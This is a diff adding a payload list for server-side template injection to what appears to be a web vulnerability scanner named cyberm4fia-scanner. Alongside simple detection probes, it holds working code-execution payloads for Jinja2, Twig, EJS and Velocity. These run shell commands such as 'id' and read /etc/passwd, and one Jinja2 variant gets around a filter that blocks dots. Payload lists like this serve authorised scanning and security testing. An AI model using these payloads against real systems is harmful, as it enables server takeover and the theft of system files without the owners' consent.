@@ -1,0 +1,46 @@
+# SSTI Payloads — cyberm4fia-scanner
+# Categories: Jinja2, Twig, EJS, Velocity, Detection, RCE
+
+# ─── Detection (Jinja2 / Flask) ───
+{{7*7}}
+{{config}}
+{{self}}
+{{request}}
+{{cycler}}
+{{lipsum}}
+
+# ─── Jinja2 RCE ───
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+
+# ─── Jinja2 Filter Bypass (dot blocked) ───
+{{request['__class__']['__mro__'][1]}}
+{{request|attr('__class__')}}
+{%for c in [].__class__.__base__.__subclasses__()%}
+{%if c.__name__=='catch_warnings'%}
+{{c()._module.__builtins__['__import__']('os').popen('id').read()}}
+{%endif%}
+{%endfor%}
+
+# ─── Twig (PHP) ───
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+
+# ─── EJS (Node.js) ───
+<%= process.mainModule.require('child_process').execSync('id') %>
+
+# ─── Velocity (Java) ───
+#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))##
+#set($chr = $x.class.forName('java.lang.Character'))##
+#set($str = $x.class.forName('java.lang.String'))##
+$rt.getRuntime().exec('id')
+
+# ─── Generic Detection ───
+${7*7}
+#{7*7}
+{{ 7+7 }}
